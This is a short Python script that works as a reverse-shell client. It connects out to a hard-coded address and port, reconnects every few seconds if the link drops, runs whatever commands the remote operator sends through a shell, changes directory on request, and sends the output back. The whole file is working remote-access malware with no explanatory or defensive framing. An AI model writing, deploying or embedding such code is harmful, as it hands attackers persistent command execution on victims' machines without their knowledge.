import socket
import subprocess
import time
import os
IP = '0.0.0.0'
PORT = "3122"
while True:
    try:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.connect((IP,int(PORT)))
        while True:
            data = sock.recv(1024).decode('utf-8')
            if data == 'exit':
                sock.close()
            clear_data = data.strip()
            if clear_data == "cd" or clear_data.startswith("cd "):
                try:
                    if clear_data == "cd":
                        path = os.path.expanduser("~")
                    else:
                        path = data[3:].strip()
                    os.chdir(path)
                    responce = f"[+] Changed directory to {os.getcwd()}\n"
                except Exception as e:
                    responce = f"Error: {e}"
                sock.send(responce.encode('utf-8'))
                continue
            output = subprocess.run(data,shell=True,capture_output=True,text=True)
            responce = output.stdout + output.stderr
            if not responce:
                responce = "\n"
            sock.send(responce.encode('utf-8'))
    except (BrokenPipeError,ConnectionResetError,socket.error) as e:
        time.sleep(5)
        continue